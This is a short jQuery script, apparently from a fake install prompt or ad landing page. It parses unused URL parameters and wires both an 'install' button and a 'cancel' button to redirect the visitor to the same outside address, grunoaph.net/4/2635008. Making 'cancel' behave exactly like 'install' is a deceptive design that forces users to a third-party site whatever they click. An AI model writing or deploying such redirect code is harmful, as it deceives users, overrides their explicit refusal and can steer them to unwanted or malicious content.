function getUrlParameter(params, key) {
    if (typeof params === 'undefined') {return undefined}
    var sURLVariables = params.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === key) {
            return sParameterName[1] === undefined ? true : sParameterName[1];
        }
    }
}


jQuery(document).ready(function() {
    var params;
    if (window.location.href.split('?').length > 1){
        params = window.location.href.split('?')[1];
        var feed = getUrlParameter(params, 'f');
        var c = getUrlParameter(params, 'c');
    }


    $('#install').click(function(e) {
        console.log(`https://grunoaph.net/4/2635008`);
        window.location = `https://grunoaph.net/4/2635008`;
    });
    
    $('#cancel').click(function(e) {
        console.log(`https://grunoaph.net/4/2635008`);
        window.location = `https://grunoaph.net/4/2635008`;
    });
});
